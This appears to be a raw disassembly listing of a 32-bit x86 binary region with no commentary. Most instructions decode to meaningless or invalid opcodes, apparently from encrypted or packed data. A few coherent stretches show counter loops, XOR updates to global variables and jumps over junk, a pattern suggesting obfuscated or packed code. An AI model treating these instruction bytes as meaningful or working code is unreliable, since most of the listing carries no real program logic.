  40daad:	add    BYTE PTR [ecx+0x75557a4c],dh
  40dab3:	pop    edx
  40dab4:	sahf   
  40dab5:	inc    ecx
  40dab6:	mov    bl,ch
  40dab8:	push   esi
  40dab9:	mov    cl,0xe6
  40dabb:	add    al,0x2e
  40dabd:	js     0x40da76
  40dabf:	push   0xffffff8a
  40dac1:	out    0x20,eax
  40dac3:	fldz   
  40dac5:	cmp    BYTE PTR [edx-0x7f48f3cb],ah
  40dacb:	out    0x46,al
  40dacd:	jmp    0x40dac5
  40dacf:	js     0x40db36
  40dad1:	dec    edi
  40dad2:	push   ebx
  40dad3:	mov    edx,0xd9577c4a
  40dad8:	mov    cs,WORD PTR [esi-0x74]
  40dadb:	(bad)  
  40dadc:	cmc    
  40dadd:	jbe    0x40daeb
  40dadf:	das    
  40dae0:	mov    ds:0xffe61995,al
  40dae5:	pop    ecx
  40dae6:	push   0x9b4f678b
  40daeb:	enter  0x2753,0x7e
  40daef:	jo     0x40db0f
  40daf1:	or     eax,0xcc060496
  40daf6:	test   BYTE PTR [eax-0x2db931e1],bh
  40dafc:	pop    edi
  40dafd:	or     BYTE PTR [ebx+edi*8],al
  40db00:	mov    dl,0x6c
  40db02:	iret   
  40db03:	or     esi,DWORD PTR [ebx+ebp*8-0x19]
  40db07:	pop    edi
  40db08:	xlat   BYTE PTR ds:[ebx]
  40db09:	pop    ecx
  40db0a:	jo     0x40dac1
  40db0c:	dec    esi
  40db0d:	mov    ebp,0x50b99625
  40db12:	gs jne 0x427a5852
  40db19:	sub    al,0x8e
  40db1b:	adc    al,0xce
  40db1d:	or     DWORD PTR [eax],esp
  40db1f:	jo     0x40db37
  40db21:	(bad)  
  40db22:	(bad)  [esi-0x4c]
  40db25:	jge    0x40db7f
  40db27:	cmp    ebx,esi
  40db29:	test   DWORD PTR [ebp+esi*8+0x55bab1fd],edx
  40db30:	movhps xmm7,QWORD PTR [edx]
  40db33:	push   0x62
  40db35:	inc    ebx
  40db36:	dec    esp
  40db37:	sub    bl,BYTE PTR [esi+0x67]
  40db3a:	jbe    0x40db5e
  40db3c:	jg     0x40db67
  40db3e:	cld    
  40db3f:	dec    esi
  40db40:	nop
  40db41:	mov    ebp,0x457461
  40db46:	mov    DWORD PTR [edx+ebx*2],eax
  40db49:	and    bl,BYTE PTR [edi-0xd1f80d8]
  40db4f:	sbb    al,0xd5
  40db51:	adc    al,BYTE PTR [eax+0x30]
  40db54:	retf   0x7ecd
  40db57:	adc    bl,BYTE PTR [ecx-0x366539a9]
  40db5d:	ins    DWORD PTR es:[edi],dx
  40db5e:	mov    esi,0x8378edec
  40db63:	retf   
  40db64:	pop    ebp
  40db65:	imul   BYTE PTR [ebx-0x6]
  40db68:	inc    ebp
  40db69:	mov    WORD PTR [edx-0x17],?
  40db6c:	mov    ch,bh
  40db6e:	test   al,0x20
  40db70:	je     0x40db76
  40db72:	cli    
  40db73:	fwait
  40db74:	cmp    al,0xc7
  40db76:	pop    esi
  40db77:	xchg   BYTE PTR [ebp+0x3f],ah
  40db7a:	retf   0xc54f
  40db7d:	dec    ebp
  40db7e:	aaa    
  40db7f:	cld    
  40db80:	pop    eax
  40db81:	adc    DWORD PTR [ebx],esi
  40db83:	fstp   st(5)
  40db85:	(bad)  
  40db87:	aaa    
  40db88:	sub    ch,BYTE PTR [edi+0x70]
  40db8b:	iret   
  40db8c:	sbb    eax,0x48094b2e
  40db91:	jmp    0xb219:0xdbc9e82b
  40db98:	push   es
  40db99:	adc    bl,BYTE PTR [ebp-0x7283838]
  40db9f:	dec    ecx
  40dba0:	in     eax,0xa3
  40dba2:	mov    dh,0x6b
  40dba4:	dec    DWORD PTR [ebp+eax*1-0x77]
  40dba8:	or     eax,0x52df891b
  40dbad:	pop    eax
  40dbae:	push   edx
  40dbaf:	retf   0x8428
  40dbb2:	(bad)  
  40dbb3:	mov    ecx,0xfc13b8c
  40dbb8:	test   DWORD PTR [eax-0x74fffffe],eax
  40dbbe:	inc    ebp
  40dbbf:	cld    
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x140145c],0xfaa74d78
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc11
  40dbe0:	push   ecx
  40dbe1:	call   0xe8d6:0x2f9ac6eb
  40dbe8:	icebp  
  40dbe9:	repnz pop ebp
  40dbeb:	enter  0x5f88,0x81
  40dbef:	inc    ebx
  40dbf0:	mov    ds:0x81cd3a4c,al
  40dbf5:	ins    BYTE PTR es:[edi],dx
  40dbf6:	int3   
  40dbf7:	xor    al,0xd5
  40dbf9:	fnstsw WORD PTR [esi-0x51]
  40dbfc:	in     eax,dx
  40dbfd:	and    al,0xae
  40dbff:	jnp    0x40db97
  40dc01:	repz cmp dl,BYTE PTR [edx]
  40dc04:	dec    ecx
  40dc05:	leave  
  40dc06:	and    ch,BYTE PTR [esi]
  40dc08:	leave  
  40dc09:	cmc    
  40dc0a:	adc    ebx,DWORD PTR [ebp-0x4c]
  40dc0d:	call   0x55ac0288
  40dc12:	in     al,0x42
  40dc14:	mov    WORD PTR [esi+0x33],cs
  40dc17:	div    BYTE PTR [edi-0x7f]
  40dc1a:	mov    al,ds:0x5205f73e
  40dc1f:	xchg   ecx,eax
  40dc20:	adc    bh,BYTE PTR [edx+ebp*2]
  40dc23:	loop   0x40dbc1
  40dc25:	xchg   ebx,eax
  40dc26:	sahf   
  40dc27:	retf   
  40dc28:	inc    esp
  40dc29:	mov    ebx,0x8c6fa446
  40dc2e:	adc    ch,bh
  40dc30:	cli    
  40dc31:	cwde   
  40dc32:	mov    cl,0xd0
  40dc34:	add    eax,0x7c01ef80
  40dc39:	mov    DWORD PTR [edi+ebp*1],0x3b802c50
  40dc40:	bound  eax,QWORD PTR [edi-0x431d3a30]
  40dc46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc47:	(bad)  
  40dc4a:	sbb    ebp,esi
  40dc4c:	out    0xcf,al
  40dc4e:	sub    ebx,DWORD PTR [edx+0x33]
  40dc51:	and    eax,0x3c437515
  40dc56:	fisttp WORD PTR [ebp+edi*2-0x39]
  40dc5a:	inc    ecx
  40dc5b:	hlt    
  40dc5c:	xor    ch,cl
  40dc5e:	pop    es
  40dc5f:	in     eax,0xe3
  40dc61:	outs   dx,DWORD PTR ds:[esi]
  40dc62:	dec    ebx
  40dc63:	aas    
  40dc64:	ror    BYTE PTR es:[esi-0x39524cdf],0xcf
  40dc6c:	add    BYTE PTR [eax+0x2cde06e8],bl
  40dc72:	sub    DWORD PTR [edx-0x22b57813],edi
  40dc78:	and    al,0x41
  40dc7a:	out    dx,al
  40dc7b:	cdq    
  40dc7c:	mov    dl,0xbc
  40dc7e:	retf   
  40dc7f:	push   es
  40dc80:	mov    ecx,0x6fce47d9
  40dc85:	out    dx,al
  40dc86:	xlat   BYTE PTR ds:[ebx]
  40dc87:	ret    
  40dc88:	ficomp WORD PTR [ebx+0x1d9001ae]
  40dc8e:	jne    0x40dc55
  40dc90:	dec    eax
  40dc91:	stc    
  40dc92:	in     eax,0x4f
  40dc94:	jnp    0x40dcab
  40dc96:	xchg   ebx,eax
  40dc97:	fsubr  QWORD PTR [ebx]
  40dc99:	push   edi
  40dc9a:	mov    edi,0x1d4d989f
  40dc9f:	enter  0x5c03,0x31
  40dca3:	xchg   esp,eax
  40dca4:	test   al,0xf2
  40dca6:	mov    bl,0x38
  40dca8:	dec    ecx
  40dca9:	pop    edi
  40dcaa:	jo     0x40dce1
  40dcac:	fcom   DWORD PTR [ebx-0x3f]
  40dcaf:	jp     0x40dcf5
  40dcb1:	mov    cl,0xd0
  40dcb3:	jne    0x40dc57
  40dcb5:	push   ss
  40dcb6:	test   DWORD PTR [esi-0x3d],0x49019d1
  40dcbd:	in     al,0x26
  40dcbf:	in     eax,0xc0
  40dcc1:	(bad)  
  40dcc2:	mov    al,ds:0x92809af0
  40dcc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcc8:	les    esi,FWORD PTR [edx+0x22]
  40dccb:	xchg   esi,eax
  40dccc:	leave  
  40dccd:	repnz fsub QWORD PTR [edi-0x5df9fd62]
  40dcd4:	inc    edx
  40dcd5:	stos   DWORD PTR es:[edi],eax
  40dcd6:	dec    esp
  40dcd7:	pop    esp
  40dcd8:	sub    ebp,esp
  40dcda:	pop    ebx
  40dcdb:	fnsave [edi]
  40dcdd:	int3   
  40dcde:	call   0x54a4:0xe8d6306c
  40dce5:	cld    
  40dce6:	mov    ds:0x313dc80,eax
  40dceb:	lds    ebp,FWORD PTR [esi+0x576b6662]
  40dcf1:	mov    al,0xf7
  40dcf3:	pushf  
  40dcf4:	call   0x3c6c:0x6b092089
  40dcfb:	pop    edx
  40dcfc:	test   eax,0xd85286d0
  40dd01:	ret    0xed88
  40dd04:	jne    0x40dcef
  40dd06:	add    al,0x86
  40dd08:	out    dx,eax
  40dd09:	xchg   ebp,eax
  40dd0a:	into   
  40dd0b:	mov    al,0xb8
  40dd0d:	cmp    ah,BYTE PTR [ecx-0x5cad00cf]
  40dd13:	or     eax,edi
  40dd15:	push   edi
  40dd16:	imul   esp,DWORD PTR ds:0x31300a20,0x4a
  40dd1d:	ss test dl,bl
  40dd20:	xchg   ah,bl
  40dd22:	scas   al,BYTE PTR es:[edi]
  40dd23:	imul   esi,DWORD PTR [ebx+0x269739f5],0x3e
  40dd2a:	retf   
  40dd2b:	push   esp
  40dd2c:	pushf  
  40dd2d:	ret    
  40dd2e:	inc    esp
  40dd2f:	mov    bl,ah
  40dd31:	das    
  40dd32:	pop    esp
  40dd33:	loope  0x40dd14
  40dd35:	or     ebx,DWORD PTR [edx]
  40dd37:	mov    DWORD PTR [eax+eiz*2],ebx
  40dd3a:	jle    0x40dd07
  40dd3c:	sti    
  40dd3d:	cmp    dh,bh
  40dd3f:	xchg   esi,eax
  40dd40:	push   ebx
  40dd41:	scas   al,BYTE PTR es:[edi]
  40dd42:	inc    ecx
  40dd43:	or     al,0x48
  40dd45:	stos   BYTE PTR es:[edi],al
  40dd46:	sub    eax,0x205ebd55
  40dd4b:	fmul   st(4),st
  40dd4d:	xchg   ebx,eax
  40dd4e:	mov    eax,ds:0x3ffaa4c9
  40dd53:	xchg   ah,al
  40dd55:	(bad)  
  40dd56:	mov    al,0xd7
  40dd58:	scas   al,BYTE PTR es:[edi]
  40dd59:	fld    TBYTE PTR [ecx]
  40dd5b:	mov    ds:0x160c6a9d,eax
  40dd60:	sub    BYTE PTR [esi],0xe
  40dd63:	dec    ebp
  40dd64:	out    0xe0,eax
  40dd66:	daa    
  40dd67:	push   ebp
  40dd68:	fsubr  QWORD PTR [edi]
  40dd6a:	loope  0x40dd94
  40dd6c:	xchg   esi,eax
  40dd6d:	lahf   
  40dd6e:	adc    edx,0x66
  40dd71:	ja     0x40dd4b
  40dd73:	dec    ecx
  40dd74:	cmp    BYTE PTR es:[ebp-0x59004fe4],bl
  40dd7b:	cmp    al,ah
  40dd7d:	and    al,0x65
  40dd7f:	adc    DWORD PTR [ebx+esi*4-0x65],ebx
  40dd83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd84:	repnz mov edi,0xa6caf840
  40dd8a:	add    DWORD PTR [ebx-0x69],esi
  40dd8d:	inc    ebp
  40dd8e:	loopne 0x40dd59
  40dd90:	aad    0xb9
  40dd92:	loop   0x40dde6
  40dd94:	(bad)  
  40dd95:	cmp    DWORD PTR [edx+0x10],eax
  40dd98:	leave  
  40dd99:	sbb    eax,0xe9b8e14b
  40dd9e:	fcomip st,st(5)
  40dda0:	and    DWORD PTR [edi],edi
  40dda2:	and    al,0xe5
  40dda4:	test   eax,0xcba868c2
  40dda9:	sub    eax,0xf22033f9
  40ddae:	pop    es
  40ddaf:	mov    ds:0xa9d9138e,eax
  40ddb4:	test   DWORD PTR [ecx],ebx
  40ddb6:	add    al,0x26
  40ddb8:	cld    
  40ddb9:	imul   esi,DWORD PTR [ecx-0x47],0xffffffa6
  40ddbd:	fcmovu st,st(5)
  40ddbf:	mov    ebp,0xe261cbe9
  40ddc4:	out    0xe8,al
  40ddc6:	ins    BYTE PTR es:[edi],dx
  40ddc7:	sub    al,0x80
  40ddc9:	lds    esi,FWORD PTR [ebx]
  40ddcb:	sub    DWORD PTR [ebp+ebp*2+0x52729611],0xffffffdf
  40ddd3:	pop    edi
  40ddd4:	inc    ebp
  40ddd5:	push   ebp
  40ddd6:	test   eax,0xdcc894fb
  40dddc:	mov    bl,dh
  40ddde:	out    dx,al
  40dddf:	je     0x40ddf1
  40dde1:	aaa    
  40dde2:	fwait
  40dde3:	mov    al,0xd4
  40dde5:	in     eax,dx
  40dde6:	mov    edi,0xd076ff6f
  40ddeb:	(bad)  [edi]
  40dded:	sub    dl,bl
  40ddef:	add    DWORD PTR [edx+0xd91be2b],esi
  40ddf5:	jecxz  0x40dda6
  40ddf7:	lock (bad) 
  40ddf9:	fsubr  QWORD PTR [edx]
  40ddfb:	and    DWORD PTR [edi-0x354be317],eax
  40de01:	cmp    ch,bl
  40de03:	fild   WORD PTR [ebx]
  40de05:	outs   dx,BYTE PTR ds:[esi]
  40de06:	mov    ebp,0x68c8735a
  40de0b:	sub    ch,bh
  40de0d:	fcmovnbe st,st(5)
  40de0f:	or     DWORD PTR [esi+0x4a68c4ff],0x4678c931
  40de19:	imul   esp,DWORD PTR [ecx],0xffffffe3
  40de1c:	cwde   
  40de1d:	sbb    ecx,edi
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43381f,0x0
  40de5a:	mov    eax,ds:0x43381f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43381f,eax
  40de65:	cmp    DWORD PTR ds:0x43381f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43381f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x43386f,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	test   ebx,0xbaeaea7f
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40de9c
  40deb3:	cmp    DWORD PTR [ebp+edx*1+0x70d97599],esi
  40deba:	push   es
  40debb:	loope  0x40de61
  40debd:	jno    0x40df2d
  40debf:	inc    eax
  40dec0:	loopne 0x40de77
  40dec2:	jmp    0xaddbaf4
  40dec7:	push   ebx
  40dec8:	das    
  40dec9:	or     al,0xf7
  40decb:	xor    DWORD PTR [eax+0x7fa01501],ebp
  40ded1:	or     al,0x2b
  40ded3:	jns    0x40debc
  40ded5:	in     eax,0x73
  40ded7:	mov    dh,0x39
  40ded9:	loopne 0x40df47
  40dedb:	jmp    0x9f8a:0x4e803183
  40dee2:	mov    ah,BYTE PTR [edi-0x23]
  40dee5:	xor    al,0x5c
  40dee7:	or     BYTE PTR [edx-0x5ff37d56],0x79
  40deee:	pop    esp
  40deef:	push   eax
  40def0:	js     0x40df51
  40def2:	retf   
  40def3:	push   ebx
  40def4:	sbb    dh,BYTE PTR [ecx+ecx*8-0x6e]
  40def8:	aam    0xa5
  40defa:	arpl   cx,ax
  40defc:	ret    
  40defd:	xchg   esp,eax
  40defe:	sub    esp,esp
  40df00:	pop    ds
  40df01:	or     BYTE PTR [edi+0x53],ah
  40df04:	xchg   edi,eax
  40df05:	adc    DWORD PTR [esi+0x53],ebp
  40df08:	mov    bh,0xab
  40df0a:	rol    BYTE PTR [eax],0xf2
  40df0d:	inc    ebp
  40df0e:	jns    0x40df12
  40df10:	mov    DWORD PTR [esi+0x6167f47f],edi
  40df16:	sti    
  40df17:	int3   
  40df18:	mov    edx,0xb173f28e
  40df1d:	inc    eax
  40df1e:	mov    edi,0x57c4e04c
  40df23:	jg     0x40df63
  40df25:	inc    eax
  40df26:	xchg   edx,eax
  40df27:	loope  0x40df6d
  40df29:	jno    0x40dfa3
  40df2b:	sbb    cl,al
  40df2d:	or     eax,0x2f28e33b
  40df32:	icebp  
  40df33:	xchg   ecx,eax
  40df34:	mov    esi,0x9b5026d0
  40df39:	lods   al,BYTE PTR ds:[esi]
  40df3a:	adc    BYTE PTR [edx+0x3029f96e],al
  40df40:	lds    edx,FWORD PTR [esp+ebp*2]
  40df43:	or     ebx,DWORD PTR [edi]
  40df45:	mov    ecx,0xafac287
  40df4a:	adc    al,0xb8
  40df4c:	jnp    0x40df7b
  40df4e:	dec    ebx
  40df4f:	arpl   WORD PTR [eax+0x7f],sp
  40df52:	sti    
  40df53:	pop    edi
  40df54:	in     al,dx
  40df55:	mov    ecx,0xea641412
  40df5a:	add    dl,BYTE PTR [edi-0x26187c20]
  40df60:	adc    eax,0xe4097fcb
  40df65:	sbb    bl,BYTE PTR [edi]
  40df67:	cmp    ebp,DWORD PTR [edx+0x44528b7]
  40df6d:	xchg   DWORD PTR [eax+0x23e8520],eax
  40df73:	add    al,dh
  40df75:	mov    ebp,0x66e767a7
  40df7a:	xor    dl,bh
  40df7c:	xchg   edx,eax
  40df7d:	sti    
  40df7e:	js     0x40dfac
  40df80:	jo     0x40dfb8
  40df82:	cmp    ebx,DWORD PTR [eax+0xa]
  40df85:	mov    ds,ebx
  40df87:	add    ecx,DWORD PTR [edx+0x5e]
  40df8a:	ds out dx,al
  40df8c:	vsubps ymm4,ymm3,YMMWORD PTR [esi+0x2fc28a81]
  40df94:	and    dh,bh
  40df96:	int3   
  40df97:	cmp    al,0xdc
  40df99:	dec    esp
  40df9a:	test   eax,0x3a079785
  40df9f:	cdq    
  40dfa0:	jg     0x40df5d
  40dfa2:	mov    bh,0x33
  40dfa4:	mov    ebp,0x10d83db
  40dfa9:	popf   
  40dfaa:	adc    BYTE PTR [eax-0x20e6e2db],dh
  40dfb0:	pop    ebp
  40dfb1:	nop
  40dfb2:	cwde   
  40dfb3:	loopne 0x40df37
  40dfb5:	xchg   ebx,eax
  40dfb6:	shl    edi,0xdc
  40dfb9:	dec    ebp
  40dfba:	and    BYTE PTR [ecx+0x46],ah
  40dfbd:	dec    ebx
  40dfbe:	mov    dh,0xc1
  40dfc0:	dec    ebx
  40dfc1:	mov    ch,0x82
  40dfc3:	out    dx,eax
  40dfc4:	data16 sbb BYTE PTR [esi+0x3cd41f62],ch
  40dfcb:	inc    ebp
  40dfcc:	adc    BYTE PTR [edx],dl
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433817,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x43386b,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	dec    esp
  40e004:	cs cmp al,0x72
  40e007:	pop    esi
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e043
  40e010:	mov    al,0xa0
  40e012:	out    dx,al
  40e013:	in     al,dx
  40e014:	pop    ebx
  40e015:	add    al,0xdf
  40e017:	fld    QWORD PTR [ebp-0x3e35f4a]
  40e01d:	ret    
  40e01e:	mov    bh,0x5a
  40e020:	cmp    eax,0x8b36c8d9
  40e025:	mov    cl,BYTE PTR [esi]
  40e027:	ja     0x40e07a
  40e029:	pop    ds
  40e02a:	lahf   
  40e02b:	cmp    DWORD PTR [ecx+0x385e5a60],edx
  40e031:	fdivrp st(0),st
  40e033:	cmp    dh,bh
  40e035:	retf   
  40e036:	test   al,0x3
  40e038:	clc    
  40e039:	test   DWORD PTR [ebx+0x67],eax
  40e03c:	test   DWORD PTR [eax+0x6b],0x6022ece8
  40e043:	mov    cl,0x33
  40e045:	dec    edi
  40e046:	cdq    
  40e047:	add    al,0x94
  40e049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e04a:	fwait
  40e04b:	call   0x4f55e39f
  40e050:	imul   esp,DWORD PTR [eax-0x24289deb],0x4f
  40e057:	daa    
  40e058:	lahf   
  40e059:	mov    es,WORD PTR [ebx-0x66]
  40e05c:	stc    
  40e05d:	ret    
  40e05e:	mov    BYTE PTR [eax],al
  40e060:	out    dx,al
  40e061:	jne    0x40dfec
  40e063:	push   DWORD PTR [ecx+0x7c]
  40e066:	and    esp,DWORD PTR [eax+0x6a]
  40e069:	les    esi,FWORD PTR [edi-0x31]
  40e06c:	fnstenv [edi+0x5cedbbca]
  40e072:	icebp  
  40e073:	jae    0x40e00f
  40e075:	(bad)
  40e07a:	mov    cl,0x29
  40e07c:	in     eax,dx
  40e07d:	fcmovb st,st(2)
  40e07f:	outs   dx,DWORD PTR ds:[esi]
  40e080:	pop    edi
  40e081:	or     dl,BYTE PTR gs:[ebx-0x51]
  40e085:	and    al,0xb6
  40e087:	adc    dl,BYTE PTR ds:[esi-0x25c628a9]
  40e08e:	mov    DWORD PTR [esi+0x212ae619],ebx
  40e094:	(bad)  
  40e095:	(bad)
  40e099:	push   eax
  40e09a:	in     al,0xbb
  40e09c:	add    cl,BYTE PTR [eax-0x74]
  40e09f:	inc    edi
  40e0a0:	out    0x83,eax
  40e0a2:	clc    
  40e0a3:	(bad)
  40e0a6:	fimul  WORD PTR [ebx]
  40e0a8:	mov    cl,0x18
  40e0aa:	pop    esi
  40e0ab:	ins    BYTE PTR es:[edi],dx
  40e0ac:	dec    esi
  40e0ad:	scas   eax,DWORD PTR es:[edi]
  40e0ae:	jp     0x40e0af
  40e0b0:	pushf  
  40e0b1:	adc    dl,BYTE PTR ds:0x5dd104e9
  40e0b7:	adc    al,0xb3
  40e0b9:	xor    edx,ebx
  40e0bb:	aam    0x93
  40e0bd:	pusha  
  40e0be:	jmp    0xcb7b:0xe9b3f854
  40e0c5:	sbb    BYTE PTR [eax-0x18b3509b],0x68
  40e0cc:	or     ebp,DWORD PTR [eax+0x5029e02a]
  40e0d2:	imul   esi,esi,0x70
  40e0d5:	cs stos DWORD PTR es:[edi],eax
  40e0d7:	out    dx,al
  40e0d8:	cmovg  ecx,DWORD PTR [esi]
  40e0db:	pop    ebp
  40e0dc:	ret    
  40e0dd:	mov    edx,0xe8114845
  40e0e2:	xchg   esi,eax
  40e0e3:	jp     0x40e07a
  40e0e5:	sbb    eax,0xabf15b38
  40e0ea:	int3   
  40e0eb:	jl     0x40e129
  40e0ed:	shl    DWORD PTR [esi+0x57fcd663],0xbe
  40e0f4:	shr    bl,1
  40e0f6:	mov    WORD PTR [edx-0x2d],?
  40e0f9:	test   eax,0x544f8f18
  40e0fe:	stc    
  40e0ff:	xlat   BYTE PTR ds:[ebx]
  40e100:	inc    ebx
  40e101:	and    ebp,edi
  40e103:	push   ds
  40e104:	xlat   BYTE PTR ds:[ebx]
  40e105:	rcr    DWORD PTR [ebx+0x1],0xd2
  40e109:	popa   
  40e10a:	ret    
  40e10b:	mov    bl,0x27
  40e10d:	outs   dx,BYTE PTR ds:[esi]
  40e10e:	(bad)  
  40e10f:	out    0xbd,al
  40e111:	pop    ebx
  40e112:	pushf  
  40e113:	cmp    al,0x4d
  40e115:	xchg   BYTE PTR [eax+eiz*1+0x5a9995d6],ah
  40e11c:	xchg   BYTE PTR [edx+0x4307c201],dh
  40e122:	cmp    eax,DWORD PTR [ebx-0x36]
  40e125:	sub    cl,bh
  40e127:	arpl   WORD PTR [esi+edi*2-0x7e39cc44],ax
  40e12e:	adc    eax,0x433823
  40e133:	xchg   edi,eax
  40e134:	and    BYTE PTR [eax],al
  40e136:	add    BYTE PTR [ebx+0x32729b],bh
  40e13c:	xor    DWORD PTR ds:0x43386f,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	mov    edx,0x7243c0b7
  40e15f:	call   0x7e7e:0x7f127e7e
  40e166:	jnp    0x40e159
  40e168:	aas    
  40e169:	nop
  40e16a:	push   edi
  40e16b:	and    ecx,DWORD PTR [edi-0x591879c]
  40e171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e172:	cwde   
  40e173:	push   eax
  40e174:	fs mov al,0xec
  40e177:	push   esp
  40e178:	jmp    0x40e165
  40e17a:	scas   eax,DWORD PTR es:[edi]
  40e17b:	pop    ds
  40e17c:	not    DWORD PTR [ebp+0x66b0b1c4]
  40e182:	or     eax,DWORD PTR [ebx]
  40e184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e185:	mov    eax,ds:0x1e1e2bd
  40e18a:	jmp    0xe7ff:0x269598f0
  40e191:	stos   BYTE PTR es:[edi],al
  40e192:	in     eax,dx
  40e193:	xchg   ecx,eax
  40e194:	and    ebx,DWORD PTR [edx]
  40e196:	shl    DWORD PTR [edi+0x77],1
  40e199:	mov    WORD PTR ds:[bx-0x1e59],fs
  40e19f:	cmp    BYTE PTR cs:[eax+0x2cc4ca90],cl
  40e1a6:	out    dx,al
  40e1a7:	add    BYTE PTR [edx+ebx*1+0x516aaadd],al
  40e1ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1af:	push   ds
  40e1b0:	pop    edx
  40e1b1:	cld    
  40e1b2:	pop    ebx
  40e1b3:	or     esi,DWORD PTR [esi-0x54]
  40e1b6:	pop    ds
  40e1b7:	sti    
  40e1b8:	push   0x3e
  40e1ba:	lea    edi,ds:0xa8e5eeba
  40e1c0:	push   ss
  40e1c1:	dec    edx
  40e1c2:	(bad)  
  40e1c3:	cmp    eax,0x5c5de6f9
  40e1c8:	pop    es
  40e1c9:	sar    eax,1
  40e1cb:	push   ds
  40e1cc:	xchg   ebx,eax
  40e1cd:	mov    ds:0xbc569e01,eax
  40e1d2:	mul    eax
  40e1d4:	or     dh,BYTE PTR [esi]
  40e1d6:	pop    edx
  40e1d7:	add    ah,BYTE PTR [edi+0x12]
  40e1da:	repz cmp al,0x54
  40e1dd:	mov    ds:0x5a107a74,al
  40e1e2:	adc    eax,0x9ea1384b
  40e1e7:	add    al,0x34
  40e1e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1ea:	and    BYTE PTR [ebx],dl
  40e1ec:	lock mov bl,0x35
  40e1ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1f0:	imul   BYTE PTR ds:0xe81a46d2
  40e1f6:	push   edx
  40e1f7:	mov    ds:0x416bad82,eax
  40e1fc:	dec    BYTE PTR [esi-0x3a84926b]
  40e202:	jp     0x40e1e0
  40e204:	pop    eax
  40e205:	cdq    
  40e206:	mov    DWORD PTR [ebx-0x2b49bb1b],ecx
  40e20c:	mov    edi,0x813e9f44
  40e211:	and    ebp,DWORD PTR [ebx]
  40e213:	sub    eax,DWORD PTR [eax-0x15e225ec]
  40e219:	pop    ecx
  40e21a:	jbe    0x40e1cc
  40e21c:	das    
  40e21d:	jl     0x40e222
  40e21f:	pop    ebx
  40e220:	shr    DWORD PTR [ebp+0x56],0xe5
  40e224:	dec    esp
  40e225:	pusha  
  40e226:	loop   0x40e28a
  40e228:	in     eax,0x0
  40e22a:	cli    
  40e22b:	adc    ecx,ebx
  40e22d:	and    BYTE PTR [ebp+0x53],0x3d
  40e231:	xor    WORD PTR ss:[esi-0x51],0xffb4
  40e237:	aad    0x69
  40e239:	or     esi,eax
  40e23b:	or     esi,DWORD PTR [esp+ebp*1]
  40e23e:	sbb    eax,0xa4ff5dd
  40e243:	ret    0xa9c5
  40e246:	or     esp,DWORD PTR [edi*1+0x207cd0b1]
  40e24d:	add    al,al
  40e24f:	hlt    
  40e250:	cmc    
  40e251:	repz push edi
  40e253:	jae    0x40e277
  40e255:	push   0xfffffff8
  40e257:	add    BYTE PTR [ebx+esi*2-0x79],dh
  40e25b:	into   
  40e25c:	mov    esi,0x199a0c9e
  40e261:	jae    0x40e2e1
  40e263:	dec    ebp
  40e264:	xor    al,BYTE PTR [ecx+0x127682c7]
  40e26a:	ret    0xe2bc
  40e26d:	jp     0x40e210
  40e26f:	into   
  40e270:	imul   edi,DWORD PTR [edx-0x7195a9ee],0x2c
  40e277:	add    DWORD PTR [eax-0xf],edx
  40e27a:	jbe    0x40e225
  40e27c:	loope  0x40e20b
  40e27e:	pop    es
  40e27f:	test   DWORD PTR [ecx+eiz*1-0x77],edx
  40e283:	inc    ebp
